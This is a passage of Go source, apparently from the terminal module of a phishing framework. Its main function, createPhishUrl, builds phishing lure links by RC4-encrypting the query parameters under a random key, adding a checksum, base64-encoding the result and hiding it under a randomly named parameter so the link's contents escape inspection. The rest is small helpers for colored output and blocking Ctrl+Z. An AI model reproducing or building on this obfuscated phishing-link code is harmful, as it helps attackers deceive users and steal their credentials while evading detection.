		_, err = f.WriteString(string(data))
		if err != nil {
			return err
		}
	}

	return nil
}

func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
	var ret string = base_url
	if len(*params) > 0 {
		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))

		enc_key := GenRandomAlphanumString(8)
		dec_params := params.Encode()

		var crc byte
		for _, c := range dec_params {
			crc += byte(c)
		}

		c, _ := rc4.NewCipher([]byte(enc_key))
		enc_params := make([]byte, len(dec_params)+1)
		c.XORKeyStream(enc_params[1:], []byte(dec_params))
		enc_params[0] = crc

		key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
		ret += "?" + key_arg + "=" + key_val
	}
	return ret
}

func (t *Terminal) sprintVar(k string, v string) string {
	vc := color.New(color.FgYellow)
	return k + ": " + vc.Sprint(v)
}

func (t *Terminal) filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}
